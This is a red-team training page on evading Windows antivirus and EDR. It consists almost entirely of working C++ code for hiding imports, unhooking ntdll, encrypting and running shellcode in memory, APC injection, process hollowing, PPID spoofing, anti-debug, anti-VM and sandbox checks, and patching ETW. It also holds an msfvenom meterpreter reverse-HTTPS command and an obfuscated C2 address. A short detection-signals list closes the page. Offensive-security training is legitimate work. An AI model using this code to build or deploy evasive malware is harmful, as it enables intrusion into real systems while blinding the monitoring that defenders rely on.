---
layout: training-page
title: "Windows API Evasion Techniques — Red Team Academy"
module: "Evasion"
tags:
  - windows-api
  - iat
  - peb
  - ntdll
  - shellcode-encryption
  - anti-analysis
  - evasion
page_key: "evasion-windows-api"
render_with_liquid: false
---

# Windows API Evasion Techniques

Modern AV/EDR solutions monitor Windows API calls by placing hooks in userland DLLs (primarily ntdll.dll) and scanning PE imports. This page covers core techniques for evading these controls: hiding API usage in the Import Address Table (IAT), resolving functions at runtime through the PEB, manually parsing export tables, unhooking ntdll, encrypting shellcode payloads, and detecting analysis environments before executing.

All techniques are demonstrated with annotated C++ examples from the AV-EDR Evasion Practical Techniques Course.

## Static Detection Avoidance

AV scanners parse PE headers to identify suspicious API imports and string constants. Two key avoidance techniques: runtime API resolution and string obfuscation.

### Runtime API Resolution (No IAT Entry)

```
// Filename: avoid_static_detection.cpp
// API calls resolved at runtime — no import in the PE's IAT
// AV cannot flag "MessageBoxA" in the import table because it's not there

#include <windows.h>
#include <iostream>

int main() {
    // Obfuscated string — not a plain "MessageBoxA" literal
    char mbox[] = { 'M','e','s','s','a','g','e','B','o','x','A','\0' };
    HMODULE user32 = LoadLibraryA("user32.dll");
    FARPROC msgFunc = GetProcAddress(user32, mbox);

    typedef int (WINAPI* MSGBOX)(HWND, LPCSTR, LPCSTR, UINT);
    MSGBOX msg = (MSGBOX)msgFunc;
    msg(NULL, "Dynamic API call.", "Evasion", MB_OK);
    return 0;
}
// Build: cl avoid_static_detection.cpp /Fe:payload.exe
```

### IOC String Obfuscation (XOR Encoding)

```
// Filename: obfuscate_iocs.cpp
// C2 addresses, registry keys, process names — encrypt at compile time,
// decrypt at runtime to avoid static string matching

#include <windows.h>
#include <iostream>

void xor_decrypt(char* data, size_t len, char key) {
    for (size_t i = 0; i < len; ++i)
        data[i] ^= key;
}

int main() {
    // Store C2 address XOR'd with 0x13 at compile time (no plaintext in binary)
    char data[] = { 'h','t','t','p',':','/','/','1','9','2','.','1','6','8','.','1','.','1','\0' };
    xor_decrypt(data, sizeof(data) - 1, 0x13);  // Encrypt at build time
    // ...binary ships with obfuscated bytes...
    xor_decrypt(data, sizeof(data) - 1, 0x13);  // Decrypt just before use

    std::cout << "C2: " << data << std::endl;
    return 0;
}
```

## IAT Manipulation

The Import Address Table (IAT) is a directory in PE headers that lists every API the binary imports. EDRs use it as a detection signal. Hiding or removing IAT entries reduces static detection surface.

### Manual IAT Resolution (No PE Import)

```
// Filename: manual_iat.cpp
// Resolve LoadLibraryA and GetProcAddress manually — these are the only
// imports needed; all other APIs are resolved at runtime without PE imports

#include <windows.h>
#include <iostream>

typedef HMODULE(WINAPI* pLoadLibraryA)(LPCSTR);
typedef FARPROC(WINAPI* pGetProcAddress)(HMODULE, LPCSTR);

int main() {
    // These two are unavoidable — but all others can be hidden
    HMODULE kernel32 = GetModuleHandleA("kernel32.dll");
    pLoadLibraryA myLoadLibraryA = (pLoadLibraryA)GetProcAddress(kernel32, "LoadLibraryA");
    pGetProcAddress myGetProcAddress = (pGetProcAddress)GetProcAddress(kernel32, "GetProcAddress");

    // Now resolve anything without adding PE imports
    HMODULE user32 = myLoadLibraryA("user32.dll");
    FARPROC msgbox = myGetProcAddress(user32, "MessageBoxA");

    typedef int (WINAPI* MSGBOX)(HWND, LPCSTR, LPCSTR, UINT);
    MSGBOX myMsg = (MSGBOX)msgbox;
    myMsg(NULL, "Manual IAT resolution.", "IAT", MB_OK);
    return 0;
}
```

### IAT Entry Zeroing (Hide at Runtime)

```
// Filename: iat_hide.cpp
// After executing sensitive imports, zero out IAT entries
// so memory scanners can't find them

#include <windows.h>
#include <iostream>

void zero_iat() {
    HMODULE mod = GetModuleHandle(NULL);
    PIMAGE_DOS_HEADER dos = (PIMAGE_DOS_HEADER)mod;
    PIMAGE_NT_HEADERS nt = (PIMAGE_NT_HEADERS)((BYTE*)mod + dos->e_lfanew);

    PIMAGE_IMPORT_DESCRIPTOR import = (PIMAGE_IMPORT_DESCRIPTOR)((BYTE*)mod +
        nt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT].VirtualAddress);

    while (import->Name) {
        PIMAGE_THUNK_DATA thunk = (PIMAGE_THUNK_DATA)((BYTE*)mod + import->FirstThunk);
        while (thunk->u1.Function) {
            DWORD old;
            VirtualProtect(&thunk->u1.Function, sizeof(LPVOID), PAGE_EXECUTE_READWRITE, &old);
            thunk->u1.Function = 0;  // Clear the function pointer
            VirtualProtect(&thunk->u1.Function, sizeof(LPVOID), old, &old);
            thunk++;
        }
        import++;
    }
}

int main() {
    // Execute sensitive work first, then erase evidence
    zero_iat();
    return 0;
}
// Warning: zeroing all entries will crash any subsequent IAT-reliant calls
```

## PEB / LDR Walk

The Process Environment Block (PEB) contains a linked list of loaded modules. Walking this list is stealthier than calling `GetModuleHandle()` — no API call, no hook, no string "kernel32.dll" in the binary.

```
// Filename: peb_ldr_walk.cpp
// Access PEB directly and enumerate loaded modules without API calls
// Used as a building block for shellcode resolvers and manual mapping

#include <windows.h>
#include <winternl.h>
#include <iostream>

typedef struct _PEB_LDR_DATA {
    ULONG Length;
    BOOLEAN Initialized;
    PVOID SsHandle;
    LIST_ENTRY InLoadOrderModuleList;
} PEB_LDR_DATA, *PPEB_LDR_DATA;

typedef struct _LDR_DATA_TABLE_ENTRY {
    LIST_ENTRY InLoadOrderLinks;
    PVOID Reserved1[2];
    PVOID DllBase;
    UNICODE_STRING FullDllName;
} LDR_DATA_TABLE_ENTRY, *PLDR_DATA_TABLE_ENTRY;

typedef struct _PEB {
    BYTE Reserved1[2];
    BYTE BeingDebugged;
    BYTE Reserved2[1];
    PVOID Reserved3[2];
    PPEB_LDR_DATA Ldr;
} PEB, *PPEB;

// Read PEB address from GS segment (x64) or FS (x86)
#ifdef _M_X64
#define PPEB_CURRENT ((PPEB)__readgsqword(0x60))
#else
#define PPEB_CURRENT ((PPEB)__readfsdword(0x30))
#endif

int main() {
    PPEB peb = PPEB_CURRENT;
    PLIST_ENTRY head = &peb->Ldr->InLoadOrderModuleList;
    PLIST_ENTRY curr = head->Flink;

    while (curr != head) {
        PLDR_DATA_TABLE_ENTRY entry = CONTAINING_RECORD(curr, LDR_DATA_TABLE_ENTRY, InLoadOrderLinks);
        wprintf(L"Module: %wZ @ 0x%p\n", &entry->FullDllName, entry->DllBase);
        curr = curr->Flink;
    }
    return 0;
}
// Use: iterate to find kernel32.dll base without GetModuleHandle, then
// parse its export table to get LoadLibraryA/GetProcAddress
```

## Export Table Parsing

GetProcAddress itself may be hooked. Parse the export table directly from the module base to retrieve function pointers without going through any hooked APIs.

```
// Filename: bypass_export_table.cpp
// Parse PE export table manually — avoids GetProcAddress hooks

#include <windows.h>
#include <iostream>

FARPROC GetExportByName(HMODULE mod, const char* funcName) {
    PIMAGE_DOS_HEADER dos = (PIMAGE_DOS_HEADER)mod;
    PIMAGE_NT_HEADERS nt = (PIMAGE_NT_HEADERS)((BYTE*)mod + dos->e_lfanew);
    DWORD expRVA = nt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress;
    PIMAGE_EXPORT_DIRECTORY exp = (PIMAGE_EXPORT_DIRECTORY)((BYTE*)mod + expRVA);

    DWORD* names     = (DWORD*)((BYTE*)mod + exp->AddressOfNames);
    WORD*  ordinals  = (WORD*) ((BYTE*)mod + exp->AddressOfNameOrdinals);
    DWORD* funcs     = (DWORD*)((BYTE*)mod + exp->AddressOfFunctions);

    for (DWORD i = 0; i < exp->NumberOfNames; ++i) {
        char* name = (char*)mod + names[i];
        if (strcmp(name, funcName) == 0) {
            return (FARPROC)((BYTE*)mod + funcs[ordinals[i]]);
        }
    }
    return NULL;
}

int main() {
    HMODULE kernel = GetModuleHandleA("kernel32.dll");
    // GetModuleHandle is still needed — replace with PEB walk to eliminate it entirely
    FARPROC exitFn = GetExportByName(kernel, "ExitProcess");
    typedef void(WINAPI* ExitType)(UINT);
    ((ExitType)exitFn)(0);
    return 0;
}
```

## ntdll Unhooking

EDRs hook ntdll.dll functions in memory. Loading a clean copy from disk and overwriting the hooked .text section removes the hooks entirely. This is one of the most effective userland hook bypass techniques.

```
// Filename: unhook_ntdll.cpp
// Replace hooked ntdll.dll in memory with a clean copy from disk
// After this runs, all ntdll calls bypass EDR userland hooks

#include <windows.h>
#include <winternl.h>
#include <iostream>
#include <fstream>

int main() {
    // Get handle to the currently-loaded (hooked) ntdll
    HMODULE ntdll = GetModuleHandleA("ntdll.dll");

    // Read clean copy from disk
    char path[MAX_PATH];
    GetSystemDirectoryA(path, MAX_PATH);
    strcat_s(path, "\\ntdll.dll");

    HANDLE hFile = CreateFileA(path, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, 0, NULL);
    DWORD size = GetFileSize(hFile, NULL);
    LPVOID buffer = VirtualAlloc(NULL, size, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    DWORD read;
    ReadFile(hFile, buffer, size, &read, NULL);
    CloseHandle(hFile);

    // Find and replace the .text section (where hooks live)
    PIMAGE_DOS_HEADER dos = (PIMAGE_DOS_HEADER)buffer;
    PIMAGE_NT_HEADERS nt = (PIMAGE_NT_HEADERS)((BYTE*)buffer + dos->e_lfanew);
    PIMAGE_SECTION_HEADER section = IMAGE_FIRST_SECTION(nt);

    for (WORD i = 0; i < nt->FileHeader.NumberOfSections; i++) {
        if (memcmp(section[i].Name, ".text", 5) == 0) {
            DWORD old;
            LPVOID dest = (LPVOID)((BYTE*)ntdll + section[i].VirtualAddress);
            LPVOID src  = (LPVOID)((BYTE*)buffer + section[i].PointerToRawData);
            VirtualProtect(dest, section[i].SizeOfRawData, PAGE_EXECUTE_READWRITE, &old);
            memcpy(dest, src, section[i].SizeOfRawData);
            VirtualProtect(dest, section[i].SizeOfRawData, old, &old);
            break;
        }
    }

    VirtualFree(buffer, 0, MEM_RELEASE);
    std::cout << "[+] ntdll unhooked\n";
    return 0;
}
// Note: requires SeDebugPrivilege or equivalent to write to ntdll pages
```

## NT API Direct Calls

Instead of Win32 API (kernel32 → ntdll → syscall), call ntdll functions directly, skipping any Win32 layer hooks. Combine with export table parsing for maximum stealth.

```
// Filename: ntapi_stager.cpp
// Call NtWriteVirtualMemory directly from ntdll — skips Win32 WriteProcessMemory wrapper
// and any hooks on it. Useful as building block for injection techniques.

#include <windows.h>
#include <winternl.h>
#include <iostream>

typedef NTSTATUS(WINAPI* pNtWriteVirtualMemory)(
    HANDLE, PVOID, PVOID, ULONG, PULONG
);

int main() {
    HMODULE ntdll = GetModuleHandleA("ntdll.dll");
    pNtWriteVirtualMemory NtWriteVirtualMemory =
        (pNtWriteVirtualMemory)GetProcAddress(ntdll, "NtWriteVirtualMemory");

    HANDLE hProc = GetCurrentProcess();
    char buffer[] = "Data written via NtAPI";
    PVOID remote = VirtualAlloc(NULL, sizeof(buffer), MEM_COMMIT, PAGE_READWRITE);

    ULONG written;
    NTSTATUS status = NtWriteVirtualMemory(hProc, remote, buffer, sizeof(buffer), &written);
    std::cout << "Status: 0x" << std::hex << status << "\n";

    VirtualFree(remote, 0, MEM_RELEASE);
    return 0;
}
// Other useful NT functions: NtAllocateVirtualMemory, NtCreateThreadEx,
// NtOpenProcess, NtProtectVirtualMemory
```

## Shellcode Encryption

Static AV engines scan bytes on disk. Encrypting shellcode at compile time means no recognizable bytes exist until runtime — the binary only contains ciphertext + a decryption stub.

### XOR Encryption (Simple, Effective)

```
// Filename: xor_shellcode.cpp
// XOR encrypt shellcode with a single-byte key
// Decryptor runs in memory — on-disk payload contains only encrypted bytes

#include <windows.h>
#include <vector>

void xorDecrypt(std::vector<BYTE>& data, BYTE key) {
    for (auto& b : data)
        b ^= key;
}

int main() {
    // Payload pre-XOR'd with 0xAB at build time
    BYTE encrypted[] = { 0x90 ^ 0xAB, 0x90 ^ 0xAB, 0xC3 ^ 0xAB };
    std::vector<BYTE> shellcode(encrypted, encrypted + sizeof(encrypted));

    xorDecrypt(shellcode, 0xAB);  // Decrypt at runtime

    void* mem = VirtualAlloc(0, shellcode.size(), MEM_COMMIT, PAGE_EXECUTE_READWRITE);
    memcpy(mem, shellcode.data(), shellcode.size());
    ((void(*)())mem)();
    return 0;
}

// Generate XOR-encrypted shellcode:
// msfvenom -p windows/x64/meterpreter/reverse_https LHOST=10.10.14.5 LPORT=443 -f raw | \
//   python3 -c "import sys; data=sys.stdin.buffer.read(); print(','.join(hex(b^0xAB) for b in data))"
```

### RC4 Encryption

```
// Filename: rc4_shellcode.cpp
// RC4 stream cipher — stronger than XOR, still fast
// Key can be passed at runtime to avoid it ever being in the binary

#include <windows.h>
#include <vector>

void rc4(BYTE* data, size_t len, const BYTE* key, size_t keyLen) {
    BYTE S[256];
    for (int i = 0; i < 256; i++) S[i] = i;

    int j = 0;
    for (int i = 0; i < 256; i++) {
        j = (j + S[i] + key[i % keyLen]) % 256;
        std::swap(S[i], S[j]);
    }

    int i = 0; j = 0;
    for (size_t k = 0; k < len; k++) {
        i = (i + 1) % 256;
        j = (j + S[i]) % 256;
        std::swap(S[i], S[j]);
        data[k] ^= S[(S[i] + S[j]) % 256];
    }
}

int main() {
    BYTE key[]       = { 'k','e','y' };
    BYTE encrypted[] = { 0xEB, 0xAD, 0xD4 };  // RC4-encrypted payload
    rc4(encrypted, sizeof(encrypted), key, sizeof(key));  // Decrypt

    void* mem = VirtualAlloc(0, sizeof(encrypted), MEM_COMMIT, PAGE_EXECUTE_READWRITE);
    memcpy(mem, encrypted, sizeof(encrypted));
    ((void(*)())mem)();
    return 0;
}
```

### AES-256 via Windows CryptoAPI

```
// Filename: aes_decrypt_exec.cpp
// AES-256 decryption using native Windows CryptoAPI
// Stronger encryption; key can be derived from a passphrase at runtime

#include <windows.h>
#include <wincrypt.h>
#pragma comment(lib, "advapi32")

bool DecryptAES(BYTE* data, DWORD size, BYTE* key, DWORD keyLen) {
    HCRYPTPROV hProv; HCRYPTKEY hKey; HCRYPTHASH hHash;

    CryptAcquireContext(&hProv, NULL, NULL, PROV_RSA_AES, CRYPT_VERIFYCONTEXT);
    CryptCreateHash(hProv, CALG_SHA_256, 0, 0, &hHash);
    CryptHashData(hHash, key, keyLen, 0);
    CryptDeriveKey(hProv, CALG_AES_256, hHash, 0, &hKey);

    DWORD len = size;
    if (!CryptDecrypt(hKey, 0, TRUE, 0, data, &len)) return false;

    CryptDestroyKey(hKey); CryptDestroyHash(hHash);
    CryptReleaseContext(hProv, 0);
    return true;
}

int main() {
    BYTE aesKey[]   = { 'A','E','S','K','E','Y','1','2','3','4','5','6','7','8','9','0' };
    BYTE encrypted[] = { /* AES-256 encrypted shellcode bytes */ };
    DWORD size = sizeof(encrypted);

    if (DecryptAES(encrypted, size, aesKey, sizeof(aesKey))) {
        void* mem = VirtualAlloc(0, size, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
        memcpy(mem, encrypted, size);
        ((void(*)())mem)();
    }
    return 0;
}
// Encrypt shellcode with Python: from Crypto.Cipher import AES
// cipher = AES.new(key, AES.MODE_CBC, iv); ct = cipher.encrypt(pad(shellcode, 16))
```

### UUID Shellcode Encoding

```
// Filename: uuid_shellcode.cpp
// Store shellcode as UUID strings — RPC function decodes at runtime
// Strings look like GUIDs: "90909090-9090-9090-9090-909090909090"

#include <windows.h>
#include <rpc.h>
#pragma comment(lib, "Rpcrt4.lib")

void DecodeAndExecute(const char* uuidStr) {
    UUID uuid;
    UuidFromStringA((RPC_CSTR)uuidStr, &uuid);  // Decode UUID bytes
    BYTE* sc = (BYTE*)&uuid;                     // 16 bytes per UUID

    void* mem = VirtualAlloc(0, 16, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
    memcpy(mem, sc, 16);
    ((void(*)())mem)();
}

// Shellcode > 16 bytes: allocate one block, then call for each UUID
// int main() {
//     const char* uuids[] = { "uuid1...", "uuid2...", ... };
//     // Allocate full block, copy each 16-byte chunk in order
// }

// Generate UUID-encoded shellcode:
// github.com/SaadAhla/ShellCode-Hide — converts raw shellcode to UUID array
```

## Injection Techniques

### APC Injection

```
// Filename: apc_injection.cpp
// Queue shellcode as an Asynchronous Procedure Call (APC) to a thread in the target
// process. APC executes when the thread enters an alertable wait state.
// Less detectable than CreateRemoteThread

#include <windows.h>
#include <tlhelp32.h>

DWORD GetPidByName(const wchar_t* name) {
    PROCESSENTRY32W pe = { sizeof(pe) };
    HANDLE snap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    DWORD pid = 0;
    if (Process32FirstW(snap, &pe)) {
        do {
            if (wcscmp(pe.szExeFile, name) == 0) { pid = pe.th32ProcessID; break; }
        } while (Process32NextW(snap, &pe));
    }
    CloseHandle(snap);
    return pid;
}

DWORD GetThreadFromPid(DWORD pid) {
    THREADENTRY32 te = { sizeof(te) };
    HANDLE snap = CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, 0);
    DWORD tid = 0;
    while (Thread32Next(snap, &te)) {
        if (te.th32OwnerProcessID == pid) { tid = te.th32ThreadID; break; }
    }
    CloseHandle(snap);
    return tid;
}

int main() {
    DWORD pid = GetPidByName(L"notepad.exe");
    DWORD tid = GetThreadFromPid(pid);
    BYTE shellcode[] = { 0x90, 0x90, 0xC3 };  // NOP NOP RET

    HANDLE hProc   = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);
    HANDLE hThread = OpenThread(THREAD_SET_CONTEXT, FALSE, tid);

    LPVOID mem = VirtualAllocEx(hProc, NULL, sizeof(shellcode), MEM_COMMIT, PAGE_EXECUTE_READWRITE);
    WriteProcessMemory(hProc, mem, shellcode, sizeof(shellcode), NULL);
    QueueUserAPC((PAPCFUNC)mem, hThread, NULL);
    // Shellcode runs when notepad's thread enters alertable wait (SleepEx, WaitForSingleObjectEx, etc.)

    CloseHandle(hThread); CloseHandle(hProc);
    return 0;
}
```

### Process Hollowing

```
// Filename: hollowing.cpp
// Create process suspended, replace entrypoint with shellcode, resume
// Process appears legitimate (notepad.exe) but runs attacker shellcode

#include <windows.h>

int main() {
    STARTUPINFO si = { sizeof(si) };
    PROCESS_INFORMATION pi;
    BYTE shellcode[] = { 0x90, 0x90, 0xC3 };

    // Create suspended — process is allocated but not running
    CreateProcess(L"C:\\Windows\\System32\\notepad.exe", NULL, NULL, NULL,
        FALSE, CREATE_SUSPENDED, NULL, NULL, &si, &pi);

    // Allocate shellcode in target process
    LPVOID mem = VirtualAllocEx(pi.hProcess, NULL, sizeof(shellcode),
        MEM_COMMIT, PAGE_EXECUTE_READWRITE);
    WriteProcessMemory(pi.hProcess, mem, shellcode, sizeof(shellcode), NULL);

    // Redirect RIP (instruction pointer) to shellcode
    CONTEXT ctx = { 0 };
    ctx.ContextFlags = CONTEXT_FULL;
    GetThreadContext(pi.hThread, &ctx);
    ctx.Rip = (DWORD_PTR)mem;  // Rip on x64, Eip on x86
    SetThreadContext(pi.hThread, &ctx);

    ResumeThread(pi.hThread);  // Now notepad.exe runs our shellcode
    return 0;
}
```

### PPID Spoofing

```
// Filename: spoofed_ppid.cpp
// Spawn a process with a spoofed parent PID
// Makes malicious child appear as child of explorer.exe (or another trusted process)
// Defeats parent-child process tree detection

#include <windows.h>

DWORD GetPidByName(const wchar_t* name) {
    PROCESSENTRY32W pe = { sizeof(pe) };
    HANDLE snap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    DWORD pid = 0;
    if (Process32FirstW(snap, &pe)) {
        do {
            if (wcscmp(pe.szExeFile, name) == 0) { pid = pe.th32ProcessID; break; }
        } while (Process32NextW(snap, &pe));
    }
    CloseHandle(snap);
    return pid;
}

int main() {
    STARTUPINFOEX siex = { 0 };
    PROCESS_INFORMATION pi = { 0 };
    siex.StartupInfo.cb = sizeof(STARTUPINFOEX);

    SIZE_T size = 0;
    InitializeProcThreadAttributeList(NULL, 1, 0, &size);
    siex.lpAttributeList = (LPPROC_THREAD_ATTRIBUTE_LIST)HeapAlloc(GetProcessHeap(), 0, size);
    InitializeProcThreadAttributeList(siex.lpAttributeList, 1, 0, &size);

    // Use explorer.exe as the fake parent
    HANDLE hParent = OpenProcess(PROCESS_ALL_ACCESS, FALSE, GetPidByName(L"explorer.exe"));
    UpdateProcThreadAttribute(siex.lpAttributeList, 0,
        PROC_THREAD_ATTRIBUTE_PARENT_PROCESS, &hParent, sizeof(HANDLE), NULL, NULL);

    CreateProcess(L"C:\\Windows\\System32\\notepad.exe", NULL, NULL, NULL, FALSE,
        EXTENDED_STARTUPINFO_PRESENT | CREATE_NEW_CONSOLE, NULL, NULL,
        &siex.StartupInfo, &pi);

    DeleteProcThreadAttributeList(siex.lpAttributeList);
    HeapFree(GetProcessHeap(), 0, siex.lpAttributeList);
    CloseHandle(hParent);
    return 0;
}
```

## Anti-Analysis Techniques

These checks execute before payload decryption. If any condition indicates a sandbox or debugger, the binary exits cleanly — the payload never runs.

### Debugger Detection

```
// Detect debugger via PEB BeingDebugged flag and hardware debug registers

#include <windows.h>
#include <iostream>

// Method 1: PEB BeingDebugged byte
bool IsBeingDebugged() {
    return IsDebuggerPresent();  // Reads PEB.BeingDebugged
}

// Method 2: Hardware breakpoints in debug registers Dr0-Dr3
bool CheckHardwareBreakpoints() {
    CONTEXT ctx = { 0 };
    ctx.ContextFlags = CONTEXT_DEBUG_REGISTERS;
    GetThreadContext(GetCurrentThread(), &ctx);
    return (ctx.Dr0 || ctx.Dr1 || ctx.Dr2 || ctx.Dr3);
}

// Method 3: Timing check (debuggers slow execution)
bool TimingCheck() {
    LARGE_INTEGER start, end, freq;
    QueryPerformanceFrequency(&freq);
    QueryPerformanceCounter(&start);
    // Do some busy work
    volatile int x = 0;
    for (int i = 0; i < 1000000; i++) x += i;
    QueryPerformanceCounter(&end);
    double elapsed = (double)(end.QuadPart - start.QuadPart) / freq.QuadPart;
    return elapsed > 0.5;  // Longer than 500ms = likely being stepped
}

int main() {
    if (IsBeingDebugged() || CheckHardwareBreakpoints() || TimingCheck()) {
        exit(0);  // Silent exit
    }
    // Execute payload
}
```

### Inline Hook Detection

```
// Filename: hook_detect.cpp
// Check if ntdll functions have been patched (hooked by EDR)
// Clean ntdll starts with: mov r10, rcx (4C 8B D1)

#include <windows.h>
#include <iostream>

bool CheckForHook(const char* func) {
    BYTE* p = (BYTE*)GetProcAddress(GetModuleHandleA("ntdll.dll"), func);
    // First 3 bytes of a clean syscall stub: 4C 8B D1 (mov r10, rcx)
    return !(p[0] == 0x4C && p[1] == 0x8B && p[2] == 0xD1);
}

int main() {
    const char* funcs[] = {
        "NtOpenProcess", "NtAllocateVirtualMemory", "NtWriteVirtualMemory",
        "NtCreateThreadEx", "NtProtectVirtualMemory"
    };
    for (auto f : funcs) {
        if (CheckForHook(f))
            std::cout << "[-] Hook detected: " << f << "\n";
        else
            std::cout << "[+] Clean: " << f << "\n";
    }
}
// If hooks found: use ntdll unhooking or direct syscalls to bypass
```

### VM Detection

```
// Filename: anti_vm.cpp
// Detect VMs via MAC address OUI prefix (VMware/VirtualBox)

#include <windows.h>
#include <iphlpapi.h>
#pragma comment(lib, "iphlpapi.lib")

bool CheckMacPrefix() {
    IP_ADAPTER_INFO info; ULONG size = sizeof(info);
    if (GetAdaptersInfo(&info, &size) == ERROR_BUFFER_OVERFLOW) {
        IP_ADAPTER_INFO* buf = (IP_ADAPTER_INFO*)malloc(size);
        GetAdaptersInfo(buf, &size);
        BYTE* mac = buf->Address;
        // VMware: 00-05-69, 00-0C-29, 00-50-56
        // VirtualBox: 08-00-27
        // Microsoft Hyper-V: 00-15-5D
        if ((mac[0]==0x00 && mac[1]==0x05 && mac[2]==0x69) ||
            (mac[0]==0x08 && mac[1]==0x00 && mac[2]==0x27) ||
            (mac[0]==0x00 && mac[1]==0x15 && mac[2]==0x5D)) {
            free(buf); return true;
        }
        free(buf);
    }
    return false;
}

// Additional VM checks:
// CPUID check: hypervisor bit in ECX (bit 31) set in VM
// Registry: HKLM\SOFTWARE\VMware, HKLM\HARDWARE\ACPI\DSDT\VBOX__
// Files: C:\Windows\System32\drivers\vmhgfs.sys, vboxguest.sys
```

### Sandbox Detection

```
// Filename: anti_sandbox.cpp
// Sandboxes simulate user interaction poorly:
// - Mouse cursor stays at (0,0) or doesn't move
// - Sleep calls are fast-forwarded
// - Uptime is very low (fresh VM snapshot)

#include <windows.h>
#include <iostream>

bool DetectMouseMovement() {
    POINT p1, p2;
    GetCursorPos(&p1);
    Sleep(2000);
    GetCursorPos(&p2);
    return (p1.x == p2.x && p1.y == p2.y);  // No movement = sandbox
}

bool DetectSleepSkip() {
    DWORD start = GetTickCount();
    Sleep(2000);
    DWORD end = GetTickCount();
    return (end - start < 1500);  // Less than 1.5s elapsed = sleep was skipped
}

bool DetectLowUptime() {
    return GetTickCount() < (60 * 1000);  // Less than 1 minute uptime
}

int main() {
    if (DetectMouseMovement() || DetectSleepSkip() || DetectLowUptime()) {
        exit(0);  // Sandbox — exit clean
    }
    // Execute payload
}
```

## ETW Bypass

Event Tracing for Windows (ETW) provides telemetry to EDRs. Patching `EtwEventWrite` in ntdll with a RET instruction silences all ETW-based telemetry for the current process. See also [ETW Bypass](/evasion/etw-bypass/) for in-depth coverage.

```
// Filename: etw_bypass.cpp
// Patch EtwEventWrite to immediately return — no ETW events generated

#include <windows.h>
#include <iostream>

void PatchETW() {
    HMODULE ntdll = GetModuleHandleA("ntdll.dll");
    void* addr = GetProcAddress(ntdll, "EtwEventWrite");

    DWORD oldProtect;
    VirtualProtect(addr, 1, PAGE_EXECUTE_READWRITE, &oldProtect);
    memset(addr, 0xC3, 1);  // 0xC3 = RET — immediately returns on every ETW call
    VirtualProtect(addr, 1, oldProtect, &oldProtect);

    std::cout << "[+] ETW patched\n";
}

// Alternative: patch EtwEventWriteFull for broader coverage
// Alternative: use NtTraceEvent syscall bypass to skip ETW at kernel level
```

## Threadless Injection

Instead of creating new threads (CreateRemoteThread is heavily monitored), queue shellcode as an APC to an existing thread. The shellcode executes when the thread naturally enters an alertable wait state.

```
// Filename: threadless_injection.cpp
// Inject shellcode via APC queue — no thread creation, no CreateRemoteThread hook

#include <windows.h>
#include <tlhelp32.h>
#include <iostream>

DWORD GetPID(const std::wstring& name) {
    PROCESSENTRY32W entry = { sizeof(entry) };
    HANDLE snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    DWORD pid = 0;
    if (Process32FirstW(snapshot, &entry)) {
        do {
            if (name == entry.szExeFile) { pid = entry.th32ProcessID; break; }
        } while (Process32NextW(snapshot, &entry));
    }
    CloseHandle(snapshot);
    return pid;
}

int wmain() {
    DWORD pid = GetPID(L"notepad.exe");
    HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);

    unsigned char shellcode[] = { /* msfvenom payload bytes */ };
    LPVOID mem = VirtualAllocEx(hProcess, NULL, sizeof(shellcode),
        MEM_COMMIT, PAGE_EXECUTE_READWRITE);
    WriteProcessMemory(hProcess, mem, shellcode, sizeof(shellcode), NULL);

    // Find any thread in the target process
    THREADENTRY32 te = { sizeof(te) };
    HANDLE snap = CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, 0);
    DWORD tid = 0;
    if (Thread32First(snap, &te)) {
        do {
            if (te.th32OwnerProcessID == pid) { tid = te.th32ThreadID; break; }
        } while (Thread32Next(snap, &te));
    }
    CloseHandle(snap);

    HANDLE hThread = OpenThread(THREAD_SET_CONTEXT, FALSE, tid);
    QueueUserAPC((PAPCFUNC)mem, hThread, NULL);
    // Shellcode runs when notepad thread calls SleepEx(), WaitForSingleObjectEx(), etc.
    std::cout << "[+] APC queued to TID " << tid << "\n";

    CloseHandle(hThread); CloseHandle(hProcess);
    return 0;
}
```

## Memory Fluctuation

Memory scanners look for static shellcode patterns in allocated regions. Continuously mutating the shellcode in memory (re-encrypting/re-decrypting it) makes signature matching unreliable.

```
// Filename: memory_mutation_fluctuation.cpp
// Periodically XOR-mutate shellcode in memory — defeats static memory scanning

#include <windows.h>
#include <thread>

unsigned char shellcode[] = { /* your payload */ };

void MutateShellcode(unsigned char* code, size_t len) {
    for (size_t i = 0; i < len; i++)
        code[i] ^= (BYTE)(i % 0xFF);  // XOR each byte with its offset
}

void RunFluctuatingShellcode() {
    size_t sz = sizeof(shellcode);
    unsigned char* mem = (unsigned char*)VirtualAlloc(0, sz, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
    memcpy(mem, shellcode, sz);

    // Background thread: mutate every 5 seconds
    std::thread([=]() {
        while (true) {
            MutateShellcode(mem, sz);   // Encrypt
            Sleep(5000);
            MutateShellcode(mem, sz);   // Decrypt before next execution window
        }
    }).detach();

    ((void(*)())mem)();  // Execute the shellcode
}

// Note: timing the mutation so shellcode is decrypted when execution resumes
// requires synchronization — use an event or mutex in production use
```

## Compilation

```
# Compile all examples for x64 Windows from Kali (cross-compile):
sudo apt install mingw-w64

# Basic:
x86_64-w64-mingw32-g++ avoid_static_detection.cpp -o payload.exe

# With crypto/iphlp libs:
x86_64-w64-mingw32-g++ aes_decrypt.cpp -o aes_payload.exe -ladvapi32
x86_64-w64-mingw32-g++ anti_vm.cpp -o anti_vm.exe -liphlpapi

# From Windows (Visual Studio developer command prompt):
cl.exe /nologo /O2 peb_ldr_walk.cpp
cl.exe /nologo /O2 uuid_shellcode.cpp /link Rpcrt4.lib
```

## Detection Signals

```
# Each technique produces EDR telemetry — know what you generate:

# VirtualAllocEx + WriteProcessMemory + CreateRemoteThread → classic injection triad
# QueueUserAPC (APC injection) → less common but monitored by modern EDRs
# CREATE_SUSPENDED + SetThreadContext → process hollowing pattern
# PROC_THREAD_ATTRIBUTE_PARENT_PROCESS → PPID spoof (visible in ETW)
# memset(EtwEventWrite, 0xC3) → ETW patch (Sysmon event 25)
